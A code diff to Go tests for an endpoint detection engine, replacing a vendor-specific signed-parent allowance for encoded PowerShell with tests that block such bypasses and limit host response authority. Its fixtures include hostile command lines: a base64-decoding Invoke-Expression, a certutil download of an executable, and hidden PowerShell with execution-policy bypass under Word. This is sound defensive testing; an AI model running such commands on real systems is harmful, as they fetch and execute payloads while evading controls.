@@ -17,27 +17,18 @@ func encodedUTF16LE(value string) string {
 	return base64.StdEncoding.EncodeToString(raw)
 }
 
-func TestKnownSignedCodexParserIsInformational(t *testing.T) {
+func TestSignedParentCannotCreateEncodedCommandAllowBypass(t *testing.T) {
 	payload := `[System.Management.Automation.Language.Parser]::ParseInput($args[0],[ref]$tokens,[ref]$errors)`
-	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand " + encodedUTF16LE(payload), ParentImage: "codex.exe", ParentSigState: "Valid", ParentSigner: `CN="OpenAI OpCo, LLC"`}
+	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand " + encodedUTF16LE(payload), ParentImage: "trusted-tool.exe", ParentSigState: "Valid", ParentSigner: "CN=Trusted Tool Vendor"}
 	result := (Evaluator{}).Analyze(event)
-	if result.EffectiveSeverity != SeverityInformational || result.Disposition != DispositionAllow || result.ConfidenceBasis != 9990 {
-		t.Fatalf("unexpected classification: %+v", result)
+	if result.Disposition != DispositionBlock || result.Classification != "UNRESOLVED ENCODED COMMAND" || result.ResponseAuthority {
+		t.Fatalf("signed parent created an encoded-command bypass: %+v", result)
 	}
 }
 
-func TestCodexNameWithoutSignatureDoesNotBypass(t *testing.T) {
-	payload := `[System.Management.Automation.Language.Parser]::ParseInput($args[0],[ref]$tokens,[ref]$errors)`
-	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -enc " + encodedUTF16LE(payload), ParentImage: "codex.exe", ParentSigState: "NotSigned"}
-	result := (Evaluator{}).Analyze(event)
-	if result.Disposition != DispositionBlock || result.EffectiveSeverity != SeverityHigh {
-		t.Fatalf("unsigned parent bypassed policy: %+v", result)
-	}
-}
-
-func TestMaliciousPayloadOverridesTrustedParent(t *testing.T) {
+func TestMaliciousPayloadOverridesSignedParent(t *testing.T) {
 	payload := `Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))`
-	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -enc " + encodedUTF16LE(payload), ParentImage: "codex.exe", ParentSigState: "Valid", ParentSigner: "CN=OpenAI OpCo, LLC"}
+	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -enc " + encodedUTF16LE(payload), ParentImage: "trusted-tool.exe", ParentSigState: "Valid", ParentSigner: "CN=Trusted Tool Vendor"}
 	result := (Evaluator{}).Analyze(event)
 	if result.Disposition != DispositionBlock || result.Classification != "SUSPICIOUS" {
 		t.Fatalf("malicious content was not blocked: %+v", result)
@@ -80,5 +71,49 @@ func TestMasqueradedPowerShellIsBlocked(t *testing.T) {
 	result := (Evaluator{}).Analyze(event)
 	if result.Disposition != DispositionBlock {
 		t.Fatalf("masqueraded shell escaped: %+v", result)
+	}
+}
+
+func TestSingleBehaviorSignalDoesNotGrantResponseAuthority(t *testing.T) {
+	event := ProcessEvent{
+		Image:        "certutil.exe",
+		ImagePath:    `C:\Windows\System32\certutil.exe`,
+		CommandLine:  `certutil.exe -urlcache -split -f https://example.invalid/a.exe`,
+		SignerStatus: "Valid",
+	}
+	result := (Evaluator{}).Analyze(event)
+	if result.Disposition != DispositionBlock {
+		t.Fatalf("expected block classification, got %s", result.Disposition)
+	}
+	if result.ResponseAuthority {
+		t.Fatal("single behavioral signal must not grant host response authority")
+	}
+}
+
+func TestIndependentSignalsGrantResponseAuthority(t *testing.T) {
+	event := ProcessEvent{
+		Image:        "powershell.exe",
+		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+		CommandLine:  `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden`,
+		SignerStatus: "Valid",
+		Ancestry:     []ProcessIdentity{{Image: "WINWORD.EXE"}},
+	}
+	result := (Evaluator{}).Analyze(event)
+	if !result.ResponseAuthority {
+		t.Fatalf("expected independent evasion signals to grant response authority: %#v", result.Signals)
+	}
+}
+
+func TestUnresolvedEncodedCommandDoesNotGrantResponseAuthority(t *testing.T) {
+	payload := "Get-Date"
+	event := ProcessEvent{
+		Image:        "powershell.exe",
+		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+		CommandLine:  "powershell.exe -EncodedCommand " + encodedUTF16LE(payload),
+		SignerStatus: "Valid",
+	}
+	result := (Evaluator{}).Analyze(event)
+	if result.ResponseAuthority {
+		t.Fatalf("unresolved encoded command must remain detection-only: %#v", result.Signals)
 	}
 }
